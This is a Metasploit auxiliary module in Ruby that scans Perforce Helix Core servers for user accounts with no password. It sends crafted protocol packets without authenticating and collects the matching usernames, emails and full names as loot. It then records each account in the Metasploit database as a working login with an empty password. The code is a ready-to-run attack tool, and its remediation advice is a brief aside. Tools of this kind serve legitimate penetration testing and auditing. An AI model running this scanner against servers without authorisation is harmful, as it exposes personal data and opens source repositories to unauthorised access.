# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/perforce'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Perforce

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Perforce Helix Core Passwordless Account Scanner',
        'Description' => %q{
          Detects Perforce (Helix Core) user accounts that have no password set.

          Sends the user-users command with the tagged output flag (tag:"").
          In tagged mode the server returns client-FstatInfo records per user.
          A missing Password field in these records indicates a passwordless
          account. Passwordless accounts allow direct unauthenticated login.

          Affected: all Perforce server versions with default settings
          (run.users.authorize=0 and security=0).

          Remediation:
          Set passwords for all accounts.
          p4 configure set dm.user.noautocreate=2
          p4 configure set security=3
        },
        'Author' => ['Morgan Robertson'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://morganrobertson.net/p4wned/']
        ],
        'DisclosureDate' => '2025-04-13',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(1666),
      OptInt.new('TIMEOUT', [true, 'Connection and read timeout (seconds)', 10])
    ])
  end

  # ---------------------------------------------------------------------------
  # Query
  # ---------------------------------------------------------------------------

  # Send a tagged user-users command and return parsed packets.
  # Returns a result hash:
  #   { packets: [], ssl_needed: bool, unicode_needed: bool, error: str|nil }
  def query_server(ip, port, use_ssl, use_unicode)
    timeout = datastore['TIMEOUT']
    port_str = use_ssl ? "ssl:#{ip}:#{port}" : "#{ip}:#{port}"

    p1 = p4_build_packet([
      ['cmpfile', ''], ['altSync', ''], ['client', '76'], ['api', '99999'],
      ['enableStreams', ''], ['enableGraph', ''], ['expandAndmaps', ''], ['chunking', ''],
      ['host', 'localhost'], ['port', port_str], ['sndbuf', '1969919'], ['rcvbuf', '98304'],
      ['autoTune', '1'], ['func', 'protocol']
    ])

    # user-users with tag:"" switches the server to client-FstatInfo tagged
    # output format. The Password field is absent for passwordless accounts.
    p2_params = [
      ['version', '2024.2/LINUX26X86_64/2697822'], ['autoLogin', ''], ['prog', 'p4'],
      ['client', 'localhost'], ['cwd', '/tmp'], ['host', 'localhost'],
      ['os', 'UNIX'], ['locale', 'C'], ['user', 'temp']
    ]
    p2_params << ['unicode', ''] if use_unicode
    p2_params += [
      ['charset', '1'], ['utf8bom', '1'], ['clientCase', '0'],
      ['tag', ''], ['func', 'user-users']
    ]

    payload = p1 + p4_build_packet(p2_params)
    release = p4_build_packet([['func', 'release']])

    begin
      sock = p4_connect(ip, port, use_ssl, timeout)
    rescue Rex::ConnectionError, Rex::ConnectionTimeout => e
      return { packets: [], ssl_needed: false, unicode_needed: false, error: e.message }
    end

    begin
      sock.put(payload)
      raw = p4_recv_response(sock, timeout)
    rescue ::EOFError, ::Errno::ECONNRESET => e
      begin
        sock.close
      rescue StandardError
        nil
      end
      return { packets: [], ssl_needed: false, unicode_needed: false, error: e.message }
    end

    if p4_tls_required?(raw, use_ssl)
      begin
        sock.close
      rescue StandardError
        nil
      end
      return { packets: [], ssl_needed: true, unicode_needed: false, error: nil }
    end

    begin
      sock.put(release)
    rescue StandardError
      nil
    end
    begin
      sock.close
    rescue StandardError
      nil
    end

    packets = p4_parse_response(raw)

    return { packets: [], ssl_needed: true, unicode_needed: false, error: nil } if p4_ssl_error_in_packets?(packets)
    return { packets: [], ssl_needed: false, unicode_needed: true, error: nil } if p4_unicode_error_in_packets?(packets)

    { packets: packets, ssl_needed: false, unicode_needed: false, error: nil }
  end

  # ---------------------------------------------------------------------------
  # Scanner entry point
  # ---------------------------------------------------------------------------

  def run_host(ip)
    port = datastore['RPORT']

    result = query_server(ip, port, false, false)
    use_ssl = false

    if result[:ssl_needed]
      result = query_server(ip, port, true, false)
      use_ssl = true
    end

    if result[:error] && result[:packets].empty?
      vprint_error("#{Rex::Socket.to_authority(ip, port)} - #{result[:error]}")
      return
    end

    result = query_server(ip, port, use_ssl, true) if result[:unicode_needed]

    # Tagged user-users response: client-FstatInfo packets with capitalised
    # field names. Password field is absent for passwordless accounts.
    passwordless = result[:packets].select do |pkt|
      pkt['func']&.b == 'client-FstatInfo'.b &&
        pkt['User'] && !pkt['User'].empty? &&
        pkt['Email'] &&
        pkt['Password'].nil?
    end

    if passwordless.empty?
      vprint_status(
        "#{Rex::Socket.to_authority(ip, port)} - No passwordless accounts found"
      )
      return
    end

    proto = use_ssl ? 'ssl' : 'tcp'

    report_service(
      host: ip,
      port: port,
      proto: 'tcp',
      name: 'perforce',
      info: "Perforce Helix Core (#{proto})"
    )

    report_vuln(
      host: ip,
      port: port,
      name: 'Perforce Helix Core Passwordless Account',
      info: "#{passwordless.length} passwordless account(s) found. " \
            'Passwordless accounts permit direct unauthenticated login.',
      refs: references
    )

    loot_lines = passwordless.map do |u|
      user = u['User'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
      email = u['Email'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
      full_name = u['FullName'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
      "#{user} <#{email}> \"#{full_name}\""
    end

    store_loot(
      'perforce.passwordless_accounts',
      'text/plain',
      ip,
      loot_lines.join("\n"),
      'perforce_passwordless.txt',
      'Perforce passwordless user accounts'
    )

    passwordless.each do |u|
      user = u['User'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
      email = u['Email'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
      full_name = u['FullName'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)

      print_good(
        "#{Rex::Socket.to_authority(ip, port)} [#{proto}] " \
        "[PASSWORDLESS] #{user} <#{email}> \"#{full_name}\""
      )

      credential_data = {
        address: ip,
        port: port,
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        origin_type: :service,
        service_name: 'perforce',
        module_fullname: fullname,
        username: user,
        private_data: '',
        private_type: :password,
        status: Metasploit::Model::Login::Status::SUCCESSFUL,
        last_attempted_at: DateTime.now
      }
      create_credential_and_login(credential_data)
    end
  end
end
